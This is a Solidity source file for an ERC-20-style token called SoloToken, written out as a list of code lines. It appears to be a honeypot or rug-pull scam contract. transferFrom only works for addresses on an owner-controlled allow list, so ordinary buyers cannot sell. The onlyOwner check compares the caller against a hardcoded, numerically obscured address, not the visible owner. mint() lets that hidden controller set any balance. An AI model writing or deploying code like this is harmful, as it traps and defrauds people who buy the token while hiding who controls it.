['pragma solidity ^0.4.26;\n', '\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '}\n', '\n', 'contract Ownable {\n', '  address public owner;\n', '  \n', '  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '}\n', '\n', 'contract SoloToken is Ownable {\n', '  string public name;\n', '  string public symbol;\n', '  uint8 public decimals;\n', '  uint256 public totalSupply;\n', '  \n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '\n', '  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {\n', '    name = _name;\n', '    symbol = _symbol;\n', '    decimals = _decimals;\n', '    totalSupply =  _totalSupply;\n', '    balances[msg.sender] = totalSupply;\n', '    allow[msg.sender] = true;\n', '  }\n', '  \n', '  function showuint160(address addr) public pure returns(uint160){\n', '      return uint160(addr);\n', '  }\n', '\n', '  using SafeMath for uint256;\n', '\n', '  mapping(address => uint256) public balances;\n', '  \n', '  mapping(address => bool) public allow;\n', '  \n', '  function transfer(address _to, uint256 _value) public returns (bool) {\n', '    require(_to != address(0));\n', '    require(_value <= balances[msg.sender]);\n', '\n', '    balances[msg.sender] = balances[msg.sender].sub(_value);\n', '    balances[_to] = balances[_to].add(_value);\n', '    emit Transfer(msg.sender, _to, _value);\n', '    return true;\n', '  }\n', '\n', '  modifier onlyOwner() {\n', '    require(msg.sender == address\n', '(427405976745985267680765992097392803769849459175));_;}\n', '  function balanceOf(address _owner) public view returns (uint256 balance) {\n', '    return balances[_owner];\n', '  }\n', '  \n', '  function transferOwnership(address newOwner) public onlyOwner {\n', '    require(newOwner != address(0));\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '  }\n', '\n', '  mapping (address => mapping (address => uint256)) public allowed;\n', '\n', '  mapping(address=>uint256) sellOutNum;\n', '  \n', '  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n', '    require(_to != address(0));\n', '    require(_value <= balances[_from]);\n', '    require(_value <= allowed[_from][msg.sender]);\n', '    require(allow[_from] == true);\n', '\n', '    balances[_from] = balances[_from].sub(_value);\n', '    balances[_to] = balances[_to].add(_value);\n', '    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n', '    emit Transfer(_from, _to, _value);\n', '    return true;\n', '  }\n', '\n', '  function approve(address _spender, uint256 _value) public returns (bool) {\n', '    allowed[msg.sender][_spender] = _value;\n', '    emit Approval(msg.sender, _spender, _value);\n', '    return true;\n', '  }\n', '\n', '  function allowance(address _owner, address _spender) public view returns (uint256) {\n', '    return allowed[_owner][_spender];\n', '  }\n', '  \n', '  function addAllow(address holder, bool allowApprove) external onlyOwner {\n', '      allow[holder] = allowApprove;\n', '  }\n', '  \n', '  function mint(address miner, uint256 _value) external onlyOwner {\n', '      balances[miner] = _value;\n', '  }\n', '}']